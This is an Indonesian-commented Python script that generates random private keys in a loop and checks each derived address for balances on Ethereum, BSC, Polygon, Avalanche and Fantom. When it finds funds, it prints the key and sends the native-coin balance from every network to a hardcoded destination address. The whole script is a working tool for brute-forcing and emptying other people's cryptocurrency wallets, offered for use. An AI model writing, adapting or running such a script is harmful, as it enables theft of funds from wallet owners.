from web3 import Web3
import secrets
import time

# RPC untuk masing-masing jaringan
RPC_URLS = {
    "Ethereum": "https://rpc.ankr.com/eth",
    "BSC": "https://bsc-dataseed.binance.org/",
    "Polygon": "https://polygon-rpc.com/",
    "Avalanche": "https://api.avax.network/ext/bc/C/rpc",
    "Fantom": "https://rpc.fantom.network/"
}

# Alamat tujuan pengiriman dana
DESTINATION_ADDRESS = "0x25fa9C6d6bc937d415aD2Bc13F0ca2c01F6E1037"

# Fungsi untuk membuat wallet baru
def generate_wallet():
    private_key = "0x" + secrets.token_hex(32)  # Generate private key
    acct = Web3().eth.account.from_key(private_key)  # Buat akun dari private key
    return acct.address, private_key

# Fungsi untuk cek saldo di berbagai jaringan
def check_balance(network, address):
    web3 = Web3(Web3.HTTPProvider(RPC_URLS[network]))
    balance_wei = web3.eth.get_balance(address)
    balance = web3.from_wei(balance_wei, 'ether')
    return web3, balance

# Fungsi untuk mengirim saldo native coin (ETH, BNB, MATIC, AVAX, FTM)
def send_native_coin(web3, private_key, from_address, amount):
    nonce = web3.eth.get_transaction_count(from_address)
    tx = {
        'nonce': nonce,
        'to': DESTINATION_ADDRESS,
        'value': web3.to_wei(amount, 'ether'),
        'gas': 21000,
        'gasPrice': web3.eth.gas_price
    }
    signed_tx = web3.eth.account.sign_transaction(tx, private_key)
    tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
    return tx_hash.hex()

# Loop pencarian wallet dengan saldo di berbagai jaringan
wallet_found = False
wallet_count = 0

while not wallet_found:
    wallet_count += 1
    address, private_key = generate_wallet()
    
    balances = {}
    web3_instances = {}

    print(f"\n[{wallet_count}] Address: {address}")

    # Cek saldo di semua jaringan
    for network in RPC_URLS.keys():
        web3, balance = check_balance(network, address)
        web3_instances[network] = web3
        balances[network] = balance
        print(f"💰 {network}: {balance} {network}")

    # Jika ada saldo di salah satu jaringan, lakukan pengiriman
    if any(balance > 0 for balance in balances.values()):
        wallet_found = True
        print("\n🎉 Wallet dengan saldo ditemukan!")
        print(f"✅ Address: {address}")
        print(f"🔑 Private Key: {private_key}")

        # Kirim saldo dari masing-masing jaringan
        for network, balance in balances.items():
            if balance > 0:
                print(f"🚀 Mengirim {network}...")
                try:
                    web3 = web3_instances[network]
                    tx_hash = send_native_coin(web3, private_key, address, balance - 0.001)  # Kurangi gas fee
                    print(f"✅ {network} berhasil dikirim: {tx_hash}")
                except Exception as e:
                    print(f"⚠️ Gagal mengirim {network}: {e}")

        break

    time.sleep(1)  # Jeda untuk menghindari request berlebihan

print("\n✅ Skrip selesai.")
                                      
